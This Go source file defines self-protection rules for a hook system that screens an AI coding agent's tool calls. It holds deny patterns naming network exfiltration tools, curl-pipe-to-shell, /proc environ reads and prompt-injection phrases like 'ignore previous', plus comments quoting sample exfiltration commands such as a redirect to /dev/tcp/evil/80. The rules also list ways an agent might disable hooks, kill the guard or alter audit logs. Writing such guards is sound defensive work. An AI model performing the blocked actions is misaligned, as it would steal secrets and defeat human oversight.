package rules

import (
	"path/filepath"
	"regexp"
	"strings"

	"github.com/Quantum-Serendipity/qsdev/internal/selfprotect/canon"
	"github.com/Quantum-Serendipity/qsdev/internal/selfprotect/cmdscan"
)

var (
	reDeleteCmd     = regexp.MustCompile(`\b(rm|unlink|shred|find|truncate)\b`)
	reSymlinkCmd    = regexp.MustCompile(`\bln\b.*-s`)
	reTraversal     = regexp.MustCompile(`\.\./`)
	reCopyCmd       = regexp.MustCompile(`\b(cp|rsync|mv|tar|dd|tee)\b`)
	reExfilCmd      = regexp.MustCompile(`\b(curl|wget|nc|ncat|socat|ssh|scp|sftp|mail|mailx|sendmail|base64)\b`)
	reEnvManip      = regexp.MustCompile(`\b(export|unset)\s+(QSDEV_|CLAUDE_|ANTHROPIC_)`)
	reEnvAssign     = regexp.MustCompile(`\b(QSDEV_CONFIG_PATH|QSDEV_BYPASS_ALL|QSDEV_DISABLE_HOOKS)\s*=`)
	reKillCmd       = regexp.MustCompile(`\b(kill|pkill|killall)\b`)
	reProcessTarget = regexp.MustCompile(`\b(qsdev|claude|gdev)\b`)
	reChmodCmd      = regexp.MustCompile(`\b(chmod|chown|chattr)\b`)
	reSedInplace    = regexp.MustCompile(`\bsed\b.*-i`)
	reAwkInplace    = regexp.MustCompile(`\bawk\b.*-i\s+inplace`)
	reMcpInjection  = regexp.MustCompile(`(?i)(system\s*prompt|ignore\s*previous|you\s+are\s+now|<\s*system\s*>|<\s*/?\s*instructions?\s*>)`)
	reBinaryMod     = regexp.MustCompile(`\b(chmod\s+\+x|install)\b`)
	reBypassExport  = regexp.MustCompile(`\b(export|unset)\s+(GDEV_HOOK_BYPASS|GDEV_BYPASS_\w+|GDEV_SELF_PROTECTION)`)
	reBypassCmd     = regexp.MustCompile(`\bqsdev\s+hook\s+bypass`)
	reAuditPath     = regexp.MustCompile(`\.qsdev/audit`)
	reCliControl    = regexp.MustCompile(`\bqsdev\s+(disable\s+hooks|enable\s+hooks\s+--force)`)
	reSystemctl     = regexp.MustCompile(`\bsystemctl\s+(stop|disable)\b.*\b(qsdev|gdev)\b`)
	reProcInfo      = regexp.MustCompile(`/proc/(?:self|\d+)/(environ|cmdline|fd/)`)
	reAuditModCmd   = regexp.MustCompile(`\b(rm|cp|mv|tee)\b|>`)
)

func containsProtectedPathStr(s string) bool {
	return canon.ContainsProtectedPath(s)
}

var (
	deleteVerbs       = map[string]bool{"rm": true, "unlink": true, "shred": true, "find": true, "truncate": true}
	copyVerbs         = map[string]bool{"cp": true, "rsync": true, "mv": true, "tar": true, "dd": true, "tee": true, "truncate": true}
	reMcpDangerousCmd = regexp.MustCompile(`(?i)\b(curl|wget|fetch)\b[^|]*\|\s*(sh|bash|zsh|source)\b|\bnpx?\s+(-y\s+)?https?://`)
)

// exfilSinks are commands that send their input off the local process: to a
// file (tee/dd/cp/mv/rsync/tar — only counted when the target is outside the
// repo), across the network, or into an opaque interpreter. A plain filter
// (grep/sort/…) is not a sink, so reading a protected file through one stays
// allowed.
var exfilSinks = map[string]bool{
	"tee": true, "dd": true, "cp": true, "mv": true, "rsync": true, "tar": true,
	"curl": true, "wget": true, "nc": true, "ncat": true, "socat": true,
	"ssh": true, "scp": true, "sftp": true, "mail": true, "mailx": true,
	"sendmail": true, "xargs": true, "sh": true, "bash": true, "zsh": true,
	"base64": true,
}

// fileSinkVerbs are exfilSinks that write to a filesystem path argument or
// redirect; for these, exfiltration is only flagged when the target is outside
// the repo (an in-repo backup is benign). Non-file sinks always count.
var fileSinkVerbs = map[string]bool{
	"tee": true, "dd": true, "cp": true, "mv": true, "rsync": true, "tar": true,
}

// argvProvesBenign reports whether the parsed commands positively prove the
// command is safe to allow despite a substring-triggered deny. It returns true
// only when: the command parsed cleanly (parseErr == nil), no word used an
// unresolved expansion, every command word is either a fully-analysed dangerous
// verb whose arguments/redirects do not touch a protected path (per argDanger /
// redirDanger) or a recognised safe-read verb, and no write redirect is
// dangerous. Any wrapper, unknown command word, expansion, or parse failure
// makes it return false, so the deny stands (fail closed).
func argvProvesBenign(
	cmds []cmdscan.Command, parseErr error,
	dangerous map[string]bool,
	argDanger func(cmdscan.Command) bool,
	redirDanger func(cmdscan.Command) bool,
) bool {
	if parseErr != nil {
		return false
	}
	for _, c := range cmds {
		if c.HasExpansion {
			return false // an expansion could hide a protected target
		}
		if redirDanger != nil && redirDanger(c) {
			return false
		}
		if dangerous[c.Name] {
			if argDanger != nil && argDanger(c) {
				return false
			}
			continue
		}
		if c.Name == "" {
			continue // nameless command (compound redirect); only redirects mattered
		}
		if cmdscan.IsSafeReadVerb(c.Name) {
			continue
		}
		return false // wrapper or unknown command word ⇒ cannot clear
	}
	return true
}

func isFlag(s string) bool { return strings.HasPrefix(s, "-") }

func nonFlagArgs(args []string) []string {
	out := make([]string, 0, len(args))
	for _, a := range args {
		if !isFlag(a) {
			out = append(out, a)
		}
	}
	return out
}

func anyProtected(paths []string) bool {
	for _, p := range paths {
		if canon.ContainsProtectedPath(p) {
			return true
		}
	}
	return false
}

// isInsideRepo reports whether path resolves to a location at or below cwd. A
// leading ~ is expanded to the home directory first, so `~/x` is correctly seen
// as outside a project repo (previously it was joined onto cwd and mistaken for
// an in-repo path, letting `cp <protected> ~/x` slip past the exfil check). An
// empty cwd or a remote spec (host:path) is treated as outside so exfil checks
// stay conservative (fail closed) when the boundary is unknown.
func isInsideRepo(path, cwd string) bool {
	if cwd == "" || looksRemote(path) {
		return false
	}
	if expanded, err := canon.ExpandTilde(path); err == nil {
		path = expanded
	}
	abs := path
	if !isRooted(abs) {
		abs = filepath.Join(cwd, path)
	}
	abs = filepath.Clean(abs)
	cwdClean := filepath.Clean(cwd)
	return abs == cwdClean || strings.HasPrefix(abs, cwdClean+string(filepath.Separator))
}

// isRooted reports whether path is absolute or begins with a path separator, so
// it must never be reinterpreted as a cwd-relative path. filepath.IsAbs alone is
// insufficient on Windows, where a POSIX-style "/tmp/x" is rooted but not
// absolute (no drive letter): joining it under cwd would wrongly place an exfil
// sink inside the repo and fail open. Treating any leading "/" or "\" as rooted
// keeps the containment check fail-closed on every platform.
func isRooted(path string) bool {
	if filepath.IsAbs(path) {
		return true
	}
	return len(path) > 0 && (path[0] == '/' || path[0] == '\\')
}

// looksRemote reports whether path is a remote scp/rsync spec (host:path or
// user@host:path) rather than a local path. It uses the same heuristic as git
// and rsync: a colon before the first path separator marks a remote host —
// except a lone Windows drive letter (e.g. C:\...), which is local. A colon
// that appears only after a separator is part of a filename and is local. This
// keeps local absolute Windows paths and colon-containing filenames from being
// misclassified as "outside the repo" and falsely denied.
func looksRemote(path string) bool {
	colon := strings.IndexByte(path, ':')
	if colon < 0 {
		return false
	}
	if colon == 1 && isASCIILetter(path[0]) {
		return false // Windows drive prefix, e.g. C:\Users\...
	}
	slash := strings.IndexAny(path, `/\`)
	return slash == -1 || colon < slash
}

func isASCIILetter(b byte) bool {
	return (b >= 'a' && b <= 'z') || (b >= 'A' && b <= 'Z')
}

// deleteTargetsProtected reports whether a Bash command deletes a protected
// path. A delete verb plus a protected path in the raw command is the deny
// trigger; the command is cleared only when argv parsing proves no delete verb
// targets a protected path (and there is no wrapper, expansion, or parse error).
// So `sh -c 'rm .claude/settings.json'`, `sudo rm …`, `… | xargs rm`, and
// `V=…; rm "$V"` all deny, while `rm -rf ../build && grep x .claude/...` clears.
func deleteTargetsProtected(ctx *EvalContext) bool {
	if !reDeleteCmd.MatchString(ctx.Command) || !containsProtectedPathStr(ctx.Command) {
		return false
	}
	cmds, err := ctx.ParsedCommands()
	return !argvProvesBenign(cmds, err, deleteVerbs,
		func(c cmdscan.Command) bool { return anyProtected(nonFlagArgs(c.Args)) },
		func(c cmdscan.Command) bool { return anyProtected(c.WriteRedirects) })
}

// copyIsDangerous reports whether a Bash command clobbers a protected path,
// exfiltrates one (a protected source copied/redirected outside the repo), or
// pipes a protected read into an exfiltration sink. A copy verb plus a protected
// path in the raw command is the deny trigger; the command is cleared only when
// argv parsing proves it benign (no wrapper/expansion/parse error, no copy verb
// touching a protected path dangerously) and no pipeline exfiltrates. A benign
// in-repo backup of a protected file stays allowed.
func copyIsDangerous(ctx *EvalContext) bool {
	if !containsProtectedPathStr(ctx.Command) {
		return false
	}
	cmds, err := ctx.ParsedCommands()
	// A write redirect that clobbers a protected path (`echo x >
	// .claude/settings.json`, `: > .claude/settings.json`) or that exfiltrates a
	// protected read to a sink outside the repo (`cat .claude/settings.json >
	// /tmp/exfil`, `> /dev/tcp/evil/80`) is dangerous no matter the command verb.
	// This mirrors bashMutatesMcpConfig's write-redirect guard but, unlike the
	// copy/exfil-verb path below, runs BEFORE the verb gate — so a plain redirect
	// (no cp/curl/pipe) is caught. It also closes the redirect form of a hook-script
	// overwrite (`echo evil > .claude/hooks/preToolUse.sh`).
	for _, c := range cmds {
		if redirectDanger(c, ctx.CWD) {
			return true
		}
	}
	// Trigger on a copy verb, a network/exfil verb, or any pipeline (which could
	// stream a protected read to a sink). A bare protected path with none of
	// these — e.g. `cat <protected>` or `rm <protected>` (SP-003's job) — is not
	// an SP-007 concern.
	hasPipe := false
	for _, c := range cmds {
		if c.Pipeline != 0 {
			hasPipe = true
			break
		}
	}
	if !reCopyCmd.MatchString(ctx.Command) && !reExfilCmd.MatchString(ctx.Command) && !hasPipe {
		return false
	}
	if !argvProvesBenign(cmds, err, copyVerbs, copyArgDanger(ctx.CWD),
		func(c cmdscan.Command) bool { return anyProtected(c.WriteRedirects) }) {
		return true
	}
	return pipelineExfil(cmds, ctx.CWD)
}

// copyArgDanger returns the per-command danger test for copy verbs. The three
// filesystem verbs differ in whether they REMOVE their source:
//
//   - cp: a non-destructive copy. Dangerous only when it clobbers a protected
//     destination or sends a protected source outside the repo (exfil). An
//     in-repo backup of a protected file (protected source → non-protected
//     in-repo dest) stays benign.
//   - mv: a move REMOVES the protected source from its enforcing location, so
//     ANY protected operand is dangerous regardless of destination — relocating
//     a protected file even to an in-repo path (`mv .claude/settings.json ./x`)
//     defeats protection. Clobbering a protected destination counts too, and
//     anyProtected covers both source and destination positions.
//   - rsync: with --remove-source-files it deletes the source after transfer, so
//     it behaves like mv (any protected operand is dangerous). Plain rsync is a
//     copy and uses the same clobber/exfil logic as cp.
//
// tar/dd/tee operand conventions vary, so any protected operand is dangerous.
func copyArgDanger(cwd string) func(cmdscan.Command) bool {
	return func(c cmdscan.Command) bool {
		paths := nonFlagArgs(c.Args)
		switch c.Name {
		case "mv":
			return anyProtected(paths) // a move removes the protected source
		case "rsync":
			if hasFlag(c.Args, "--remove-source-files") {
				return anyProtected(paths) // source-removing rsync behaves like mv
			}
			return copyClobberOrExfil(paths, cwd)
		case "cp":
			return copyClobberOrExfil(paths, cwd)
		default: // tar, dd, tee
			return anyProtected(paths)
		}
	}
}

// copyClobberOrExfil reports whether a non-destructive copy (cp, or plain rsync)
// is dangerous: it clobbers a protected destination, or it sends a protected
// source to a destination outside the repo (exfil). An in-repo backup of a
// protected file stays benign.
func copyClobberOrExfil(paths []string, cwd string) bool {
	if len(paths) < 2 {
		return anyProtected(paths)
	}
	dest := paths[len(paths)-1]
	srcs := paths[:len(paths)-1]
	if canon.ContainsProtectedPath(dest) {
		return true // clobbering a protected destination
	}
	return !isInsideRepo(dest, cwd) && anyProtected(srcs) // exfil
}

// hasFlag reports whether args contains the exact long option flag (e.g.
// --remove-source-files). Long options take no value here, so an exact match is
// sufficient.
func hasFlag(args []string, flag string) bool {
	for _, a := range args {
		if a == flag {
			return true
		}
	}
	return false
}

// redirectDanger reports whether a single command's write redirect either
// clobbers a protected path or exfiltrates a protected read to a sink outside the
// repo. A protected write target is always a clobber (`echo x >
// .claude/settings.json`); an outside-repo target combined with reading a
// protected path (in args or input redirects) is an exfiltration (`cat
// .claude/settings.json > /tmp/exfil`, `> /dev/tcp/evil/80`). An in-repo redirect
// target (e.g. `> settings.bak`) stays allowed as a benign backup.
func redirectDanger(c cmdscan.Command, cwd string) bool {
	if len(c.WriteRedirects) == 0 {
		return false
	}
	readsProtected := anyProtected(nonFlagArgs(c.Args)) || anyProtected(c.ReadRedirects)
	for _, target := range c.WriteRedirects {
		if canon.ContainsProtectedPath(target) {
			return true // clobbering a protected destination
		}
		if readsProtected && !isInsideRepo(target, cwd) {
			return true // exfiltrating a protected read to an outside-repo sink
		}
	}
	return false
}

// pipelineExfil reports whether any pipeline reads a protected source in an
// upstream stage and pipes it to an exfiltration sink downstream. File-writing
// sinks (tee/dd/cp/…) count only when their target is outside the repo, so an
// in-repo backup like `cat <protected> | tee settings.bak` stays allowed and a
// pure filter like `cat <protected> | grep foo` (a read) is not exfil.
func pipelineExfil(cmds []cmdscan.Command, cwd string) bool {
	groups := make(map[int][]cmdscan.Command)
	for _, c := range cmds {
		if c.Pipeline != 0 {
			groups[c.Pipeline] = append(groups[c.Pipeline], c)
		}
	}
	for _, stages := range groups {
		readProtected := false
		for _, c := range stages {
			if anyProtected(nonFlagArgs(c.Args)) || anyProtected(c.ReadRedirects) {
				readProtected = true
			}
			if !readProtected || !exfilSinks[c.Name] {
				continue
			}
			if !fileSinkVerbs[c.Name] {
				return true // network or opaque interpreter sink
			}
			for _, p := range nonFlagArgs(c.Args) {
				if !isInsideRepo(p, cwd) {
					return true
				}
			}
			for _, p := range c.WriteRedirects {
				if !isInsideRepo(p, cwd) {
					return true
				}
			}
		}
	}
	return false
}

// mcpDangerousVerbs are the verbs bashMutatesMcpConfig fully analyses: the
// mutating verbs plus in-place editors (sed/awk). A mention of these targeting
// an MCP config is a mutation.
var mcpDangerousVerbs = map[string]bool{
	"cp": true, "mv": true, "dd": true, "tee": true, "rm": true,
	"install": true, "truncate": true, "sed": true, "awk": true,
}

// commandMentionsMcpConfig reports whether the raw command references an MCP
// config path anywhere (the cheap deny trigger).
func commandMentionsMcpConfig(command string) bool {
	s := filepath.ToSlash(command)
	return strings.Contains(s, ".mcp.json") ||
		strings.Contains(s, ".cursor/mcp.json") ||
		strings.Contains(s, ".vscode/mcp.json")
}

func anyMcpConfigPath(paths []string) bool {
	for _, p := range paths {
		if isMCPConfigPath(p) {
			return true
		}
	}
	return false
}

// bashMutatesMcpConfig reports whether a Bash command writes/redirects to or
// mutates an MCP config file (as opposed to merely reading it). A mention of an
// MCP config is the deny trigger; the command is cleared only when argv parsing
// proves no mutating verb or write redirect targets it (and there is no wrapper,
// expansion, or parse error). So `sh -c 'echo x > .mcp.json'`, `{ echo x; } >
// .mcp.json`, and `sed -i … .mcp.json` deny, while `cat .mcp.json` and
// `jq . .mcp.json` (reads) clear.
func bashMutatesMcpConfig(ctx *EvalContext) bool {
	if !commandMentionsMcpConfig(ctx.Command) {
		return false
	}
	cmds, err := ctx.ParsedCommands()
	return !argvProvesBenign(cmds, err, mcpDangerousVerbs,
		func(c cmdscan.Command) bool { return anyMcpConfigPath(nonFlagArgs(c.Args)) },
		func(c cmdscan.Command) bool { return anyMcpConfigPath(c.WriteRedirects) })
}

func isWriteOrEdit(toolName string) bool {
	return toolName == "Write" || toolName == "Edit" || toolName == "MultiEdit"
}

func isMCPConfigPath(path string) bool {
	normalized := filepath.ToSlash(path)
	return strings.HasSuffix(normalized, ".mcp.json") ||
		strings.Contains(normalized, ".cursor/mcp.json") ||
		strings.Contains(normalized, ".vscode/mcp.json")
}

var (
	symlinkVerbs     = map[string]bool{"ln": true}
	hookMutateVerbs  = map[string]bool{"chmod": true, "chown": true, "chattr": true, "sed": true, "awk": true}
	auditMutateVerbs = map[string]bool{"rm": true, "unlink": true, "shred": true, "cp": true, "mv": true, "tee": true, "dd": true, "truncate": true}
)

func underHooksDir(p string) bool { return strings.Contains(filepath.ToSlash(p), ".claude/hooks/") }
func underAuditDir(p string) bool { return strings.Contains(filepath.ToSlash(p), ".qsdev/audit") }

func anyUnderHooksDir(paths []string) bool {
	for _, p := range paths {
		if underHooksDir(p) {
			return true
		}
	}
	return false
}

func anyUnderAuditDir(paths []string) bool {
	for _, p := range paths {
		if underAuditDir(p) {
			return true
		}
	}
	return false
}

// symlinkTargetsProtected reports whether `ln` targets a protected path. Same
// substring-trigger + argv-clear shape as SP-003/SP-007: a wrapper/expansion/
// parse error cannot clear the deny.
func symlinkTargetsProtected(ctx *EvalContext) bool {
	if !reSymlinkCmd.MatchString(ctx.Command) || !containsProtectedPathStr(ctx.Command) {
		return false
	}
	cmds, err := ctx.ParsedCommands()
	return !argvProvesBenign(cmds, err, symlinkVerbs,
		func(c cmdscan.Command) bool { return anyProtected(nonFlagArgs(c.Args)) },
		func(c cmdscan.Command) bool { return anyProtected(c.WriteRedirects) })
}

// traversalReachesProtected reports whether a `..`-containing argument or
// redirect target resolves to a protected path. This is the targeted fix for
// the DEFECT-10 false positive: the old rule denied any command that merely
// contained `../` and a protected path in unrelated segments (e.g.
// `rm -rf ../build && grep x .claude/settings.json`). Now only a traversal that
// actually points at a protected path denies. Fails closed on a parse error.
func traversalReachesProtected(ctx *EvalContext) bool {
	if !reTraversal.MatchString(ctx.Command) || !containsProtectedPathStr(ctx.Command) {
		return false
	}
	cmds, err := ctx.ParsedCommands()
	if err != nil {
		return true
	}
	for _, c := range cmds {
		targets := append(nonFlagArgs(c.Args), c.WriteRedirects...)
		targets = append(targets, c.ReadRedirects...)
		for _, a := range targets {
			if !strings.Contains(a, "..") {
				continue
			}
			if canon.ContainsProtectedPath(a) {
				return true
			}
			resolved := a
			if !filepath.IsAbs(resolved) && ctx.CWD != "" {
				resolved = filepath.Join(ctx.CWD, a)
			}
			if canon.ContainsProtectedPath(filepath.Clean(resolved)) {
				return true
			}
		}
	}
	return false
}

// hookScriptMutated reports whether an in-place mutator (chmod/chown/chattr or
// sed/awk in-place) targets a file under .claude/hooks/. Reads clear.
func hookScriptMutated(ctx *EvalContext) bool {
	modifiesInPlace := reChmodCmd.MatchString(ctx.Command) ||
		reSedInplace.MatchString(ctx.Command) ||
		reAwkInplace.MatchString(ctx.Command)
	if !modifiesInPlace || !strings.Contains(ctx.Command, ".claude/hooks/") {
		return false
	}
	cmds, err := ctx.ParsedCommands()
	return !argvProvesBenign(cmds, err, hookMutateVerbs,
		func(c cmdscan.Command) bool { return anyUnderHooksDir(nonFlagArgs(c.Args)) },
		func(c cmdscan.Command) bool { return anyUnderHooksDir(c.WriteRedirects) })
}

// auditTrailMutated reports whether a mutating verb or write redirect targets a
// file under .qsdev/audit. Reads clear.
func auditTrailMutated(ctx *EvalContext) bool {
	if !reAuditPath.MatchString(ctx.Command) || !reAuditModCmd.MatchString(ctx.Command) {
		return false
	}
	cmds, err := ctx.ParsedCommands()
	return !argvProvesBenign(cmds, err, auditMutateVerbs,
		func(c cmdscan.Command) bool { return anyUnderAuditDir(nonFlagArgs(c.Args)) },
		func(c cmdscan.Command) bool { return anyUnderAuditDir(c.WriteRedirects) })
}

var sp001 = Rule{
	ID:       "SP-001",
	Name:     "Config file write block",
	Category: "self-protection",
	Evaluate: func(ctx *EvalContext) (Verdict, string) {
		if !isWriteOrEdit(ctx.ToolName) {
			return Allow, ""
		}
		protected, category := canon.IsProtected(ctx.CanonicalPath)
		if protected && (category == "config" || category == "claude-settings" || category == "system-config") {
			return Deny, "write to protected config path: " + ctx.CanonicalPath
		}
		return Allow, ""
	},
}

var sp002 = Rule{
	ID:       "SP-002",
	Name:     "Config file read block",
	Category: "self-protection",
	Evaluate: func(ctx *EvalContext) (Verdict, string) {
		if ctx.ToolName != "Read" {
			return Allow, ""
		}
		normalizedPath := filepath.ToSlash(ctx.CanonicalPath)
		sensitiveFragments := []string{"/policy/", "/trust.yaml", "/session-state.json", "managed-settings.json"}
		for _, frag := range sensitiveFragments {
			if strings.Contains(normalizedPath, frag) {
				protected, _ := canon.IsProtected(ctx.CanonicalPath)
				if protected {
					return Deny, "read of sensitive security config: " + ctx.CanonicalPath
				}
			}
		}
		return Allow, ""
	},
}

var sp003 = Rule{
	ID:       "SP-003",
	Name:     "Config file delete block",
	Category: "self-protection",
	Evaluate: func(ctx *EvalContext) (Verdict, string) {
		if ctx.ToolName != "Bash" {
			return Allow, ""
		}
		if deleteTargetsProtected(ctx) {
			return Deny, "delete command targeting protected path"
		}
		return Allow, ""
	},
}

var sp004 = Rule{
	ID:       "SP-004",
	Name:     "Config symlink creation block",
	Category: "self-protection",
	Evaluate: func(ctx *EvalContext) (Verdict, string) {
		if ctx.ToolName != "Bash" {
			return Allow, ""
		}
		if symlinkTargetsProtected(ctx) {
			return Deny, "symlink creation targeting protected config path"
		}
		return Allow, ""
	},
}

var sp005 = Rule{
	ID:       "SP-005",
	Name:     "Config path traversal block",
	Category: "self-protection",
	Evaluate: func(ctx *EvalContext) (Verdict, string) {
		if ctx.ToolName != "Bash" {
			return Allow, ""
		}
		if traversalReachesProtected(ctx) {
			return Deny, "path traversal reaching protected config"
		}
		return Allow, ""
	},
}

var sp006 = Rule{
	ID:       "SP-006",
	Name:     "Proc filesystem read block",
	Category: "self-protection",
	Evaluate: func(ctx *EvalContext) (Verdict, string) {
		if ctx.ToolName != "Read" && ctx.ToolName != "Bash" {
			return Allow, ""
		}
		if ctx.CanonicalPath != "" && reProcInfo.MatchString(ctx.CanonicalPath) {
			return Deny, "access to sensitive proc filesystem path"
		}
		if ctx.ToolName == "Bash" && reProcInfo.MatchString(ctx.Command) {
			return Deny, "access to sensitive proc filesystem path"
		}
		return Allow, ""
	},
}

var sp007 = Rule{
	ID:       "SP-007",
	Name:     "Config copy/redirect block",
	Category: "self-protection",
	Evaluate: func(ctx *EvalContext) (Verdict, string) {
		if ctx.ToolName != "Bash" {
			return Allow, ""
		}
		if copyIsDangerous(ctx) {
			return Deny, "copy/redirect command targeting protected config"
		}
		return Allow, ""
	},
}

var sp008 = Rule{
	ID:       "SP-008",
	Name:     "Environment variable manipulation block",
	Category: "self-protection",
	Evaluate: func(ctx *EvalContext) (Verdict, string) {
		if ctx.ToolName != "Bash" {
			return Allow, ""
		}
		if reEnvManip.MatchString(ctx.Command) || reEnvAssign.MatchString(ctx.Command) {
			return Deny, "manipulation of security-related environment variables"
		}
		return Allow, ""
	},
}

var sp009 = Rule{
	ID:       "SP-009",
	Name:     "Process management block",
	Category: "self-protection",
	Evaluate: func(ctx *EvalContext) (Verdict, string) {
		if ctx.ToolName != "Bash" {
			return Allow, ""
		}
		if (reKillCmd.MatchString(ctx.Command) && reProcessTarget.MatchString(ctx.Command)) ||
			reSystemctl.MatchString(ctx.Command) {
			return Deny, "process management targeting security processes"
		}
		return Allow, ""
	},
}

var sp010 = Rule{
	ID:       "SP-010",
	Name:     "Hook script modification block",
	Category: "self-protection",
	Evaluate: func(ctx *EvalContext) (Verdict, string) {
		if ctx.ToolName != "Bash" {
			return Allow, ""
		}
		if hookScriptMutated(ctx) {
			return Deny, "modification of hook scripts"
		}
		return Allow, ""
	},
}

var mcp001 = Rule{
	ID:       "MCP-001",
	Name:     "Tool description injection",
	Category: "mcp-poisoning",
	Evaluate: func(ctx *EvalContext) (Verdict, string) {
		if !isWriteOrEdit(ctx.ToolName) {
			return Allow, ""
		}
		if (strings.HasSuffix(ctx.FilePath, ".mcp.json") || strings.HasSuffix(ctx.CanonicalPath, ".mcp.json")) && reMcpInjection.MatchString(ctx.Content) {
			return Deny, "injection patterns detected in MCP config write"
		}
		return Allow, ""
	},
}

var mcp002 = Rule{
	ID:       "MCP-002",
	Name:     "Cross-tool file access",
	Category: "mcp-poisoning",
	Evaluate: func(ctx *EvalContext) (Verdict, string) {
		if !strings.HasPrefix(ctx.ToolName, "mcp__") {
			return Allow, ""
		}
		protected, _ := canon.IsProtected(ctx.CanonicalPath)
		if protected {
			return Deny, "MCP tool accessing protected path: " + ctx.CanonicalPath
		}
		return Allow, ""
	},
}

var mcp005 = Rule{
	ID:       "MCP-005",
	Name:     "Server config tampering",
	Category: "mcp-poisoning",
	Evaluate: func(ctx *EvalContext) (Verdict, string) {
		// Allow benign structural edits to an MCP config; deny only when the
		// written content carries prompt-injection or a remote-code-execution
		// server command. (MCP-001 also guards injection content.)
		if isWriteOrEdit(ctx.ToolName) && (isMCPConfigPath(ctx.CanonicalPath) || isMCPConfigPath(ctx.FilePath)) {
			if reMcpInjection.MatchString(ctx.Content) || reMcpDangerousCmd.MatchString(ctx.Content) {
				return Deny, "MCP server configuration write with dangerous content"
			}
			return Allow, ""
		}
		// A Bash command that mutates (writes/redirects to) an MCP config is a
		// blind, un-inspectable overwrite; deny it. Reads are allowed.
		if ctx.ToolName == "Bash" && bashMutatesMcpConfig(ctx) {
			return Deny, "modification of MCP server configuration"
		}
		return Allow, ""
	},
}

var int001 = Rule{
	ID:       "INT-001",
	Name:     "Binary modification block",
	Category: "integrity",
	Evaluate: func(ctx *EvalContext) (Verdict, string) {
		if ctx.ToolName != "Bash" {
			return Allow, ""
		}
		if reBinaryMod.MatchString(ctx.Command) && strings.Contains(ctx.Command, ".qsdev/bin/") {
			return Deny, "modification of security binary"
		}
		return Allow, ""
	},
}

var sp011 = Rule{
	ID:       "SP-011",
	Name:     "Bypass export block",
	Category: "self-protection",
	Evaluate: func(ctx *EvalContext) (Verdict, string) {
		if ctx.ToolName != "Bash" {
			return Allow, ""
		}
		if reBypassExport.MatchString(ctx.Command) {
			return Deny, "export of hook bypass environment variable"
		}
		return Allow, ""
	},
}

var sp012 = Rule{
	ID:       "SP-012",
	Name:     "Bypass command block",
	Category: "self-protection",
	Evaluate: func(ctx *EvalContext) (Verdict, string) {
		if ctx.ToolName != "Bash" {
			return Allow, ""
		}
		if reBypassCmd.MatchString(ctx.Command) {
			return Deny, "invocation of hook bypass command"
		}
		return Allow, ""
	},
}

var sp013 = Rule{
	ID:       "SP-013",
	Name:     "Audit trail write block",
	Category: "self-protection",
	Evaluate: func(ctx *EvalContext) (Verdict, string) {
		if isWriteOrEdit(ctx.ToolName) {
			protected, category := canon.IsProtected(ctx.CanonicalPath)
			if protected && category == "audit" {
				return Deny, "write to audit trail"
			}
		}
		if ctx.ToolName == "Bash" && auditTrailMutated(ctx) {
			return Deny, "write to audit trail"
		}
		return Allow, ""
	},
}

var sp014 = Rule{
	ID:       "SP-014",
	Name:     "CLI security control block",
	Category: "self-protection",
	Evaluate: func(ctx *EvalContext) (Verdict, string) {
		if ctx.ToolName != "Bash" {
			return Allow, ""
		}
		if reCliControl.MatchString(ctx.Command) {
			return Deny, "CLI command modifying security configuration"
		}
		return Allow, ""
	},
}

// Tier1Rules contains all 18 enforce-always Tier 1 self-protection rules.
var Tier1Rules = NewRuleSet(
	sp001, sp002, sp003, sp004, sp005, sp006, sp007, sp008, sp009, sp010,
	mcp001, mcp002, mcp005,
	int001,
	sp011, sp012, sp013, sp014,
)
